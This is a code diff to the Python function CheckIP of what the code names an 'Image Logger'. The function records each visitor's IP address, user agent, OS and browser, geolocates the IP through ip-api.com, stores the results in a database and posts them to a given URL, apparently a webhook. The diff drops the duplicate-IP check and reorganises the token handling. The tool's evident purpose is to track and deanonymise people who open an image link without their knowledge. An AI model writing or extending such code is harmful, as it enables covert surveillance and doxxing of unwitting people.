@@ -72,40 +72,24 @@ blacklistedIPs = ("27", "104", "143", "164")
 
 
 def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=None, port=None, filename=None, url_thumbnail=None, botname='Image Logger', db: Session = None):
-    if not curd.check_ip_exist(ip, db=db):
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-        os, browser = httpagentparser.simple_detect(useragent)
-        if token:
-            if curd.check_exists_token(db, token=token):
-                logger_model = schemas.loggers(
-                    ip=f'{ip}',
-                    user_agents=str(useragent),
-                    device=f'{os} - {browser}',
-                    ip_info=str(info),
-                    filename=filename,
-                    token=token,
-                    time_stamp=timestamp,
-                    created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                )
-                logger_res = curd.create_logger(db, loggers=logger_model)
-                embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=token, url_thumnail=url_thumbnail, type='Success - ', id=logger_res.id)
-                res =requests.post(url, json=embed)
-                return logger_res
-            else:
-                logger_model_error = schemas.logger_error(
-                    ip=f'{ip}',
-                    user_agents=str(useragent),
-                    device=f'{os} - {browser}',
-                    ip_info=str(info),
-                    filename=filename,
-                    token=f'Unknow token: {token}',
-                    time_stamp=timestamp,
-                    created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                )
-                logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
-                embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=f'Unknow token: {token}', url_thumnail=url_thumbnail, type='Error - ', id=logger_res.id)
-                res =requests.post(url, json=embed)
-                return logger_res
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    os, browser = httpagentparser.simple_detect(useragent)
+    if token:
+        if curd.check_exists_token(db, token=token):
+            logger_model = schemas.loggers(
+                ip=f'{ip}',
+                user_agents=str(useragent),
+                device=f'{os} - {browser}',
+                ip_info=str(info),
+                filename=filename,
+                token=token,
+                time_stamp=timestamp,
+                created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            )
+            logger_res = curd.create_logger(db, loggers=logger_model)
+            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=token, url_thumnail=url_thumbnail, type='Success: ', id=logger_res.id)
+            res =requests.post(url, json=embed)
+            return logger_res
         else:
             logger_model_error = schemas.logger_error(
                 ip=f'{ip}',
@@ -113,14 +97,29 @@ def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=Non
                 device=f'{os} - {browser}',
                 ip_info=str(info),
                 filename=filename,
-                token='BruteForce server',
+                token=f'Unknow token: {token}',
                 time_stamp=timestamp,
                 created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             )
             logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
-            embed = export_data(ip_info=info, created_at=str(timestamp)[:-6], ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token='BruteForce server', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
+            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=f'Unknow token: {token}', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
             res =requests.post(url, json=embed)
             return logger_res
+    else:
+        logger_model_error = schemas.logger_error(
+            ip=f'{ip}',
+            user_agents=str(useragent),
+            device=f'{os} - {browser}',
+            ip_info=str(info),
+            filename=filename,
+            token='BruteForce server',
+            time_stamp=timestamp,
+            created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        )
+        logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
+        embed = export_data(ip_info=info, created_at=str(timestamp)[:-6], ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token='BruteForce server', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
+        res =requests.post(url, json=embed)
+        return logger_res
 
 
 # Generate a random 8-character string
